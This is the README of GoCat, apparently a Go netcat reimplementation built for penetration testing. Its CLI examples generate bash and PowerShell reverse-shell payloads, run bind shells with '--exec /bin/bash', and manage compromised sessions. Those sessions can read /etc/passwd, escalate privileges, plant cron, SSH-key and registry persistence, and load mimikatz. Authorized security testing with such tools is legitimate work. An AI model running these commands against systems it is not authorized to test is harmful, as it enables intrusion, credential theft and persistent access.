# GoCat

[![Go Version](https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go)](https://golang.org)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue)](LICENSE)
[![Release](https://img.shields.io/github/v/release/realibrahimsql/Gocat)](https://github.com/realibrahimsql/Gocat/releases)
[![Build Status](https://img.shields.io/github/actions/workflow/status/realibrahimsql/Gocat/ci.yml)](https://github.com/realibrahimsql/Gocat/actions)

<div align="center">
  <img src="https://raw.githubusercontent.com/realibrahimsql/Gocat/main/assets/Gocat.png" alt="GoCat Logo" width="300" height="300">
</div>

**A cross-platform netcat alternative written in Go**

[Quick Start](#quick-start) • [Features](#features) • [Installation](#installation) • [Usage](#usage) • [Contributing](#contributing)

---

## Overview

GoCat covers the traditional netcat workflow (listen, connect, transfer, scan) and adds session handling with PTY upgrade, port forwarding, file transfer with checksums, and post-exploitation helper modules. It runs on Linux, macOS, Windows, and FreeBSD.

---

## Demos

### Version and Diagnostics
<details>
<summary>Click to expand</summary>

![Version Demo](demos/gifs/version.gif)

```bash
gocat version              # Human-readable version
gocat version --json       # Machine-readable build info
gocat doctor               # Environment diagnostics
gocat verify               # Self-test smoke checks
```
</details>

### Interactive Console
<details open>
<summary>Click to expand</summary>

![Console Demo](demos/gifs/console.gif)

```bash
gocat console              # Launch interactive console
# Commands: listen, connect, sessions, interact, exec, script,
#           open, upgrade, upload, download, spawn, maintain,
#           agent, portfwd, modules, run, search, info,
#           payloads, set, show
```
</details>

### Port Scanning
<details>
<summary>Click to expand</summary>

![Scan Demo](demos/gifs/scan.gif)

```bash
gocat scan localhost --ports 22,80,443,8080
gocat scan --ports 1-1024 --concurrency 200 example.com
```

Flags: `--ports`, `--concurrency` (default 100), `--verbose-scan`, `--open`, `--udp`.
</details>

### Reverse Shell Payloads
<details>
<summary>Click to expand</summary>

![Payload Demo](demos/gifs/payload.gif)

```bash
gocat payload 10.10.14.5 4444 --type bash   # Specific type
gocat payload 10.10.14.5 4444 --type powershell --encode
```
</details>

### Listen and Connect
<details>
<summary>Click to expand</summary>

![Listen-Connect Demo](demos/gifs/listen-connect.gif)

```bash
gocat listen 8080                            # Simple listener
gocat listen --session --auto-upgrade 4444   # Session mode
gocat listen --session --single-session 4444 # Stop after first session
gocat listen --iface eth0 4444               # Bind via interface address
gocat listen --listen-ssl 4443               # TLS (self-signed if no cert given)
gocat listen --ssh-trigger user@target 4444  # SSH in and trigger a callback
echo 'Hello!' | gocat connect localhost 8080
```
</details>

### Session Management
<details>
<summary>Click to expand</summary>

![Session Demo](demos/gifs/session.gif)

```bash
gocat console
> listen 4444
> sessions                 # List active sessions
> interact 1               # Attach to session (F12 to detach)
> upgrade 1 auto           # Upgrade to PTY
> exec 1 whoami            # Run a command through the session
> script 1 enum.sh         # Run a local script in memory, no disk touch
> open 1 /etc/passwd       # Download and open locally
> search privesc           # Search post-exploitation modules
> info linpeas             # Module details (info <id> for sessions)
> run escalate 1           # GTFOBins-based escalation suggestions
> run implant 1            # cron/key/systemd/profile/reg/task persistence
> spawn 1                  # Spawn new reverse shell
> maintain 2               # Keep 2 sessions per host
> agent 1                  # Deploy Python agent
> portfwd 1 8080 127.0.0.1:80  # Port forward through agent
> set lhost 10.0.0.5       # Saved to ~/.gocatrc automatically
```
</details>

### Sessions Export and Reports

```bash
gocat session list --json --output sessions.json
gocat session list --csv
gocat console
> run enumerate 1          # Cache facts, writes ENUM.md
> run report 1 out.md      # Markdown host report to file
```
</details>

### File Transfer
<details>
<summary>Click to expand</summary>

![Transfer Demo](demos/gifs/transfer.gif)

```bash
gocat transfer send file.bin host 9999 --progress --checksum
gocat transfer receive 9999 output.bin
```
</details>

### Shell Stabilization
<details>
<summary>Click to expand</summary>

![Stabilize Demo](demos/gifs/stabilize.gif)

```bash
gocat stabilize --upgrade --method all   # Show all methods
gocat stabilize --upgrade --method python  # Specific method
```
</details>

---

## Features

### Networking
- TCP/UDP with IPv4/IPv6 dual-stack
- TLS listeners and connections (TLS 1.2+)
- SOCKS5 and HTTP proxy support, SSH tunnels (local, remote, dynamic)
- Port forwarding, multi-port listeners, Unix domain sockets
- DNS tunneling, WebSocket server/client, HTTP reverse proxy with health checks
- Packet sniffer, network benchmarks, Prometheus metrics (`/metrics`, `/health`)

### Sessions and Post-Exploitation
- Session registry with logging, maintain-N respawn, per-host caps, JSON/CSV export
- PTY auto-upgrade (python/script/socat), in-memory script execution
- Upload/download, local/remote port forwarding through sessions
- Helper modules: linpeas/winpeas, adPEAS, GhostPack Seatbelt, mimikatz, chisel, ligolo-ng, enumeration and host reports, implant tracking
- Escalation suggestions from an offline GTFOBins database (sudo/suid/caps/writable-PATH)
- Persistence implants: cron, systemd user service, shell profile, SSH key, Windows Run key, scheduled task
- Console settings persist to `~/.gocatrc`; Ctrl+C cancels the line, F12/Ctrl+] detaches

### Everyday Tooling
- Shell completion (bash, zsh, fish, PowerShell), color themes, Lua scripting
- Structured logging, Debian packaging, man pages in `docs/man`

---

## Installation

### Build from Source

Prerequisite: Go 1.24+.

```bash
git clone https://github.com/realibrahimsql/Gocat.git
cd Gocat
go build -o gocat .
```

The Makefile covers the rest: `make build`, `make test`, `make lint`, `make build-all`.

### Release Archives

Every tag builds tarballs per platform plus a Debian package (see [Releases](https://github.com/realibrahimsql/Gocat/releases)):

```bash
# Linux amd64, version 1.0.0 as example
wget https://github.com/realibrahimsql/Gocat/releases/download/v1.0.0/gocat-1.0.0-linux-amd64.tar.gz
tar -xzf gocat-1.0.0-linux-amd64.tar.gz
sudo install -m 0755 gocat-1.0.0-linux-amd64/gocat /usr/local/bin/gocat
```

Debian/Ubuntu:

```bash
sudo dpkg -i gocat_*.deb
```

### Docker

```bash
docker build -t gocat .
docker run --rm -it gocat --help
```

---

## Quick Start

### Connect and Listen

```bash
gocat connect example.com 80
gocat connect --shell /bin/bash example.com 22

gocat listen 8080
gocat listen --exec /bin/bash 8080
gocat listen --interactive 8080
```

### Secure Connections

```bash
gocat connect --ssl --verify-cert example.com 443
gocat connect --ssl --ca-cert /path/to/ca.pem example.com 443
gocat listen --ssl --ssl-cert cert.pem --ssl-key key.pem 8080
gocat listen --allow 192.168.1.0/24 --deny 192.168.1.100 8080
```

### Tunnels and Forwarding

```bash
gocat tunnel --ssh user@server --local 8080 --remote localhost:80
gocat tunnel --ssh user@server --reverse --local 3000 --remote 8080
gocat tunnel --ssh user@server --dynamic 1080
gocat tunnel --ssh user@server --key ~/.ssh/id_rsa --local 8080 --remote 80
```

### More Commands

```bash
gocat unix listen /tmp/gocat.sock
gocat unix listen --type datagram --permissions 0600 /tmp/dgram.sock
gocat websocket server --port 8080
gocat metrics --port 9090
gocat script scripts/examples/port_scanner.lua
gocat multi-listen --ports 8080,8081,8082
gocat convert --from tcp:8080 --to udp:backend:9000
```

Global flags work everywhere: `-v`, `--debug`, `--json`, `-o/--output`, `--udp`, `--ssl`, `--proxy`, `--config`.

---

## Configuration

`gocat --config ~/.gocat.yml` loads YAML (JSON also works). Keys mirror `internal/config`:

```yaml
network:
  default_timeout: 30s
  keep_alive: 30s
  max_connections: 100
  bind_address: 0.0.0.0
logger:
  level: info
  format: text
  output: stdout
security:
  rate_limit:
    enabled: false
    max_requests: 100
```

---

## Development

```bash
make build          # Binary without pcap
make build-pcap     # With packet capture (needs libpcap)
make test           # Full test suite
make test-coverage  # With coverage report
make lint           # golangci-lint
make check          # fmt + vet + lint + security + vuln
```

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Bug reports and feature requests use the templates in `.github/ISSUE_TEMPLATE/`. Keep PRs focused; `go test ./...`, `go vet ./...`, and `gofmt -s -l` must be clean.

Report security issues privately through a GitHub security advisory instead of a public issue.

---

## License

Apache-2.0. See [LICENSE](LICENSE).

Netcat was written by Hobbit; GoCat is an independent reimplementation of the idea in Go.
